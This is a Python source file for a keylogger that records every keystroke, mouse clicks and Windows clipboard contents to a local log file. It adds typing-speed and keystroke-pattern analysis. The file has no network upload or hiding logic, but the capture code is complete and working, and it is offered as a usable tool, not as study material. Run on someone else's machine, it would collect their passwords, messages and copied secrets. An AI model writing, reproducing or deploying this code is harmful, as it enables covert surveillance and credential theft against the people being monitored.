#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import base64
import threading
import logging
from datetime import datetime
from typing import Optional, Dict, List, Tuple, Union

try:
    from pynput import keyboard, mouse
    import win32clipboard
    import win32con
    PYNPUT_AVAILABLE = True
    WIN32_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False
    WIN32_AVAILABLE = False
    logging.warning("Required modules (pynput or pywin32) not available, keylogger functionality will be limited")

class KeystrokeAnalyzer:
    """Analyzes keystroke patterns and typing behavior"""
    
    def __init__(self):
        """Initialize the keystroke analyzer"""
        self.keystroke_times: List[Tuple[str, float]] = []
        self.typing_speed: float = 0.0  # WPM
        self.common_patterns: Dict[str, int] = {}
        self.special_keys = {
            'Key.space': ' ',
            'Key.enter': '\n',
            'Key.tab': '\t',
            'Key.backspace': '<BS>',
            'Key.shift': '<SHIFT>',
            'Key.ctrl_l': '<CTRL_L>',
            'Key.ctrl_r': '<CTRL_R>',
            'Key.alt_l': '<ALT_L>',
            'Key.alt_r': '<ALT_R>',
            'Key.delete': '<DEL>',
            'Key.esc': '<ESC>'
        }
    
    def format_key(self, key: Union[keyboard.Key, str]) -> str:
        """Format keyboard key to string representation
        
        Args:
            key: Keyboard key event or string
            
        Returns:
            str: String representation of the key
        """
        try:
            key_str = str(key)
            if hasattr(key, 'char') and key.char:
                return key.char
            return self.special_keys.get(key_str, key_str.replace('Key.', '<') + '>')
        except AttributeError:
            return str(key)
    
    def add_keystroke(self, key: Union[keyboard.Key, str], timestamp: float) -> None:
        """Add a keystroke event for analysis
        
        Args:
            key: Keyboard key event or string
            timestamp: Time of keystroke
        """
        formatted_key = self.format_key(key)
        self.keystroke_times.append((formatted_key, timestamp))
        if len(self.keystroke_times) > 1000:  # Keep last 1000 keystrokes
            self.keystroke_times.pop(0)
            
        # Update patterns
        if len(self.keystroke_times) >= 3:
            pattern = ''.join([k for k, _ in self.keystroke_times[-3:]])
            self.common_patterns[pattern] = self.common_patterns.get(pattern, 0) + 1
    
    def analyze_typing_speed(self) -> float:
        """Calculate typing speed in words per minute
        
        Returns:
            float: Typing speed in WPM
        """
        if len(self.keystroke_times) < 2:
            return 0.0
        
        total_time = self.keystroke_times[-1][1] - self.keystroke_times[0][1]
        if total_time <= 0:
            return 0.0
            
        # Count only printable characters (excluding special keys)
        char_count = sum(1 for k, _ in self.keystroke_times if len(k) == 1 and k.isprintable())
        # Assume average word length of 5 characters
        self.typing_speed = (char_count / 5) / (total_time / 60) if char_count > 0 else 0.0
        return self.typing_speed
    
    def find_patterns(self) -> Dict[str, int]:
        """Identify common keystroke patterns
        
        Returns:
            Dict[str, int]: Dictionary of patterns and their frequencies (top 10)
        """
        # Return top 10 patterns
        return dict(sorted(self.common_patterns.items(), 
                         key=lambda x: x[1], 
                         reverse=True)[:10])

class Keylogger:
    """Advanced keylogger with keystroke analysis and clipboard monitoring"""
    
    def __init__(self):
        """Initialize the keylogger"""
        self.logs: List[str] = []
        self.running: bool = False
        self.thread: Optional[threading.Thread] = None
        self.mouse_thread: Optional[threading.Thread] = None
        self.clipboard_thread: Optional[threading.Thread] = None
        self.analyzer = KeystrokeAnalyzer()
        self.log_file = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'logs', 'keylog.txt')
        self._lock = threading.Lock()
        
        # Create logs directory if it doesn't exist
        os.makedirs(os.path.dirname(self.log_file), exist_ok=True)
    
    def _on_press(self, key: keyboard.Key) -> None:
        """Callback function for key press events
        
        Args:
            key: Key object from pynput
        """
        try:
            timestamp = time.time()
            formatted_time = datetime.fromtimestamp(timestamp).isoformat()
            char = self.analyzer.format_key(key)
            
            with self._lock:
                log_entry = f"[{formatted_time}] Key: {char}"
                self.logs.append(log_entry)
                self.analyzer.add_keystroke(key, timestamp)
                
                with open(self.log_file, 'a', encoding='utf-8') as f:
                    f.write(log_entry + '\n')
                
        except Exception as e:
            logging.error(f"Error in keylogger: {e}")
    
    def _on_mouse_click(self, x: int, y: int, button: mouse.Button, pressed: bool) -> None:
        """Callback function for mouse events
        
        Args:
            x: X coordinate
            y: Y coordinate
            button: Mouse button
            pressed: Pressed state
        """
        try:
            timestamp = datetime.now().isoformat()
            action = "pressed" if pressed else "released"
            button_name = str(button).replace('Button.', '')
            log_entry = f"[{timestamp}] Mouse {action} at ({x}, {y}) - {button_name}"
            self.logs.append(log_entry)
            
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(log_entry + '\n')
        except Exception as e:
            logging.error(f"Error logging mouse event: {e}")
    
    def _monitor_clipboard(self) -> None:
        """Monitor clipboard for changes"""
        if not WIN32_AVAILABLE:
            return
            
        last_content = None
        while self.running:
            try:
                win32clipboard.OpenClipboard()
                if win32clipboard.IsClipboardFormatAvailable(win32con.CF_TEXT):
                    content = win32clipboard.GetClipboardData(win32con.CF_TEXT)
                    if isinstance(content, bytes):
                        content = content.decode('utf-8', errors='ignore')
                    
                    if content != last_content:
                        timestamp = datetime.now().isoformat()
                        log_entry = f"[{timestamp}] Clipboard: {content}"
                        self.logs.append(log_entry)
                        
                        with open(self.log_file, 'a', encoding='utf-8') as f:
                            f.write(log_entry + '\n')
                        
                        last_content = content
                win32clipboard.CloseClipboard()
            except Exception as e:
                logging.error(f"Clipboard monitoring error: {e}")
                try:
                    win32clipboard.CloseClipboard()
                except:
                    pass
            time.sleep(1)
    
    def start(self) -> bool:
        """Start the keylogger with mouse tracking and clipboard monitoring
        
        Returns:
            bool: True if started successfully
        """
        if self.running or not PYNPUT_AVAILABLE:
            logging.error("Cannot start keylogger: already running or required modules not available")
            return False
        
        self.running = True
        
        # Start keyboard listener
        def _keylogger_thread():
            try:
                with keyboard.Listener(on_press=self._on_press) as listener:
                    listener.join()
            except Exception as e:
                logging.error(f"Keyboard listener error: {e}")
        
        self.thread = threading.Thread(target=_keylogger_thread, daemon=True)
        self.thread.start()
        
        # Start mouse listener
        def _mouse_thread():
            try:
                with mouse.Listener(on_click=self._on_mouse_click) as listener:
                    listener.join()
            except Exception as e:
                logging.error(f"Mouse listener error: {e}")
        
        self.mouse_thread = threading.Thread(target=_mouse_thread, daemon=True)
        self.mouse_thread.start()
        
        # Start clipboard monitor
        if WIN32_AVAILABLE:
            self.clipboard_thread = threading.Thread(target=self._monitor_clipboard, daemon=True)
            self.clipboard_thread.start()
        
        logging.info("Keylogger started with mouse tracking and clipboard monitoring")
        return True
    
    def stop(self) -> None:
        """Stop all monitoring"""
        if not self.running:
            return
        
        self.running = False
        
        # Wait for threads to terminate
        for thread in [self.thread, self.mouse_thread, self.clipboard_thread]:
            if thread and thread.is_alive():
                thread.join(timeout=1.0)
        
        self.thread = None
        self.mouse_thread = None
        self.clipboard_thread = None
        
        logging.info("All monitoring stopped")
    
    def get_logs(self) -> Dict:
        """Get all captured events
        
        Returns:
            dict: Dictionary containing logs and analysis
        """
        return {
            'logs': self.logs.copy(),
            'typing_speed': self.analyzer.analyze_typing_speed(),
            'common_patterns': self.analyzer.find_patterns()
        }
    
    def clear_logs(self) -> None:
        """Clear all logs and analysis data"""
        self.logs.clear()
        self.analyzer = KeystrokeAnalyzer()
        
        try:
            with open(self.log_file, 'w', encoding='utf-8') as f:
                f.write('')
            logging.info("All logs cleared")
        except Exception as e:
            logging.error(f"Error clearing logs: {e}")

if __name__ == "__main__":
    # Configure logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    
    # Example usage
    keylogger = Keylogger()
    if keylogger.start():
        try:
            print("Keylogger running. Type some text and click mouse. Press Ctrl+C to stop.")
            time.sleep(10)  # Run for 10 seconds
        except KeyboardInterrupt:
            pass
        finally:
            keylogger.stop()
            logs = keylogger.get_logs()
            print(f"Typing speed: {logs['typing_speed']:.2f} WPM")
            print("Common patterns:", logs['common_patterns'])
            print("Last 5 log entries:", logs['logs'][-5:])